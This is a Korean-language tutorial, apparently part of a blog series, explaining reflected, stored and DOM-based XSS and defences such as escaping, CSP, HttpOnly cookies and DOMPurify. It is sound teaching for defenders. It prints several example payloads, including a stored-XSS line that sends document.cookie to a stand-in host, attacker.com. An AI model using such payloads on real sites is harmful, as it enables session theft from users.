XSS가 뭔가

Cross-Site Scripting. 공격자의 스크립트가 다른 사용자의 브라우저에서 실행되는 사고예요. 브라우저는 그 사이트의 컨텍스트에서 스크립트를 실행하니까, 그 사이트의 쿠키·토큰·세션이 다 노출돼요.

최악의 시나리오는 "공격자가 피해자의 세션 쿠키를 훔쳐 그 사용자로 로그인". 또는 피해자 권한으로 임의 동작 수행, 또는 키로깅. 사용자 한 명을 인질로 잡는 수준의 공격이에요.

세 가지 종류

종류원리예시
ReflectedURL 파라미터가 응답에 반영검색 결과 페이지에 검색어 그대로 노출
StoredDB에 저장된 악성 입력이 다른 사용자에게 표시댓글, 게시글, 프로필
DOM클라이언트 JS가 입력을 DOM에 끼워 넣음SPA, 해시 라우터

Reflected XSS

공격자가 악성 스크립트가 포함된 URL을 피해자에게 전달해요. 피해자가 클릭하면 그 URL의 파라미터가 페이지에 그대로 출력되면서 스크립트가 실행돼요. 

// 위험한 코드
<p>검색어: ${searchQuery}</p>

// 공격자가 보낸 URL
http://example.com/search?q=<script>steal()</script>

// 렌더링 결과
<p>검색어: <script>steal()</script></p>

Stored XSS

악성 스크립트가 서버에 저장되고, 다른 사용자가 그 페이지를 방문할 때마다 실행돼요. Reflected보다 위험해요. URL 클릭 한 번 안 해도 피해를 입을 수 있고, 한 게시글이 수천 명에게 노출돼요. 

// 댓글에 저장된 악성 입력
<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>

// 다른 사용자가 글을 보면 자기 쿠키가 attacker.com으로 전송

DOM-based XSS

서버 응답은 깨끗한데, 클라이언트 JavaScript가 사용자 입력을 받아 DOM에 직접 끼워 넣을 때 발생해요. URL hash, query string, localStorage 같은 입력을 innerHTML로 넣으면 발생해요. 

// 위험한 클라이언트 코드
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `안녕, ${name}`;

// URL: ?name=<img src=x onerror=alert(1)>
// → onerror 실행

핵심 방어: 출력 시 escape

XSS 방어의 1순위는 HTML 출력 시 escape예요. 사용자 입력을 HTML로 렌더링할 때 특수 문자(<, >, &, ", ')를 HTML 엔티티로 변환해요.

원문이스케이프
<&lt;
>&gt;
&&amp;
"&quot;
'&#x27;

이렇게 하면 <script>가 텍스트로만 보이고 실행되지 않아요. 대부분의 템플릿 엔진(Thymeleaf, Vue, React, Django)은 기본으로 escape를 해줘요. 우리가 의식적으로 escape를 끄지 않는 한 안전해요.

위험한 자리들

다음 자리에서는 escape가 자동으로 안 되거나, 다른 종류의 escape가 필요해요.

1. innerHTML / v-html / dangerouslySetInnerHTML

이 API들은 escape를 하지 않아요. 사용자 입력을 절대 직접 넣으면 안 돼요. 대신 textContent나 {value} JSX 표현식을 써요. 부득이 HTML을 넣어야 하면 DOMPurify 같은 sanitizer로 정제.

2. URL 속성에 입력 넣기

// 위험
<a href="${userInput}">링크</a>

// 공격: userInput = "javascript:alert(1)"
// 클릭하면 alert 실행

방어는 프로토콜 화이트리스트예요. http://, https://, mailto:만 허용하고 javascript:, data:는 차단해요.

3. JavaScript 컨텍스트에 입력

<script>
  const name = "${userInput}";   // 위험
</script>

HTML escape로는 부족해요. JavaScript 문자열 컨텍스트는 따로 escape가 필요해요. < 같은 유니코드 형태로. 또는 데이터를 JSON으로 만들어 별도로 처리해요. 또는 data-* 속성으로 전달해요.

4. CSS 컨텍스트에 입력

거의 안 만나지만 가능해요. CSS도 escape 규칙이 따로 있어요. 사용자 입력을 CSS에 직접 넣지 마세요.

Content Security Policy (CSP)

XSS가 발생해도 영향을 제한하는 헤더 기반 방어예요. 어떤 스크립트를 어디서 로드할지를 서버가 응답 헤더로 선언. 

// 응답 헤더
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;

script-src 'self'면 같은 도메인의 스크립트만 실행돼요. 인라인 스크립트(<script>alert(1)</script>)는 차단돼요. 공격자가 stored XSS로 인라인 스크립트를 심어도 브라우저가 실행을 거부해요.

주의: 'unsafe-inline'을 켜면 CSP의 의미가 거의 사라져요. 인라인 스크립트가 다 허용되니까. 의도적으로 두지 마세요. 인라인이 필요하면 nonce나 hash를 써요.

HTTP-only 쿠키: 토큰 탈취 방어

XSS가 노리는 주요 목표는 세션 쿠키 탈취예요. document.cookie로 읽어다가 외부로 보내요.

세션 쿠키에 HttpOnly 플래그를 켜면 JavaScript가 그 쿠키를 못 읽어요. 브라우저는 요청에 자동으로 첨부하지만, JS 코드에서는 안 보여요. XSS가 발생해도 세션 탈취는 막혀요. 

// 응답에서 쿠키 설정
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

세션 쿠키는 항상 HttpOnly + Secure + SameSite로 설정해요. 비용 거의 없고 효과는 큼.

Sanitization: 사용자 HTML 허용해야 할 때

블로그 댓글에서 일부 HTML 태그(<b>, <i>, <a>)를 허용하고 싶을 때가 있어요. 그땐 escape 대신 sanitize가 필요해요. 허용 태그·속성만 통과시키고 위험한 건 제거. 

// DOMPurify 사용
import DOMPurify from 'dompurify';

const dirty = userInput;   // <script>alert(1)</script><b>hi</b>
const clean = DOMPurify.sanitize(dirty);
// 결과: <b>hi</b>

직접 정규식으로 sanitize 안 해요. 우회 패턴이 너무 많아요. 반드시 검증된 라이브러리(DOMPurify, OWASP Java HTML Sanitizer 등)를 써요.

한 줄 정리

  • 출력 시 HTML escape가 1순위. 템플릿 엔진의 기본 동작 유지.
  • innerHTML, v-html, dangerouslySetInnerHTML 피하기.
  • 세션 쿠키는 HttpOnly + Secure + SameSite.
  • CSP로 다층 방어.
  • HTML 허용해야 하면 직접 만들지 말고 DOMPurify 같은 sanitizer.

다음 편

마지막 편에서는 CSRF(Cross-Site Request Forgery)를 봐요. XSS와 자주 헷갈리는 공격이에요. SameSite 쿠키, CSRF 토큰, double submit cookie 패턴을 정리해요.
